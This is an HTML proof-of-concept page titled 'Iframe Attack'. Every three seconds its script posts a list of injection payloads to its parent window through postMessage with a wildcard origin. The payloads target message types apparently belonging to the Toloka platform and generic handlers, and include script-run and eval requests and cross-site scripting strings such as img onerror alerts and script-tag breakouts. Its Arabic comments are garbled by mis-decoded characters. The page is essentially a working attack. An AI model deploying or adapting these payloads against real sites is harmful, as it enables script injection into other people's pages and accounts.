<!DOCTYPE html>
<html>
<head>
  <title>Iframe Attack</title>
</head>
<body>
  <h1>ðŸ”¥ iframe PoC</h1>
  <script>
    const targetOrigin = "*"; // Ø±ØºÙ… Ø£Ù† Ø§Ù„Ø£Ù… ØªØªØ­Ù‚Ù‚ ØºØ§Ù„Ø¨Ù‹Ø§ØŒ Ù†Ø±Ø³Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ù…ÙŠØ¹

    const payloads = [
      { type: "TOLOKA_SET_CONFIG", config: { darkMode: true, lang: "ru" } },
      { type: "TOLOKA_UI_UPDATE", element: "header", content: "<h1>ðŸ”¥ PWNED</h1>" },
      { type: "TOLOKA_RUN_SCRIPT", script: "alert('Code from iframe executed in parent')" },
      { type: "task-update", task: { id: "123", name: "Fake Task", html: "<script>alert('TASK PWNED')</script>" } },
      { type: "eval", payload: "console.log('Executed by eval inside parent')" },
      { type: "config", payload: { update: true, lang: "en", inject: "</script><img src=x onerror=alert(1)>" } },
      { type: "rpc", method: "setTitle", args: ["ðŸ”¥ Set from iframe"] },
      { type: "set", key: "hacked", value: "<img src=x onerror=alert(document.domain)>" },
    ];

    function sendAllPayloads() {
      payloads.forEach(p => {
        console.log("ðŸ“¤ Sending:", p);
        window.parent.postMessage(p, targetOrigin);
      });
    }

    setInterval(sendAllPayloads, 3000); // ÙƒÙ„ 3 Ø«ÙˆØ§Ù†ÙŠ Ù„Ø¥Ø²Ø¹Ø§Ø¬ Ø§Ù„Ù…Ø³ØªÙ„Ù…
  </script>
</body>
</html>
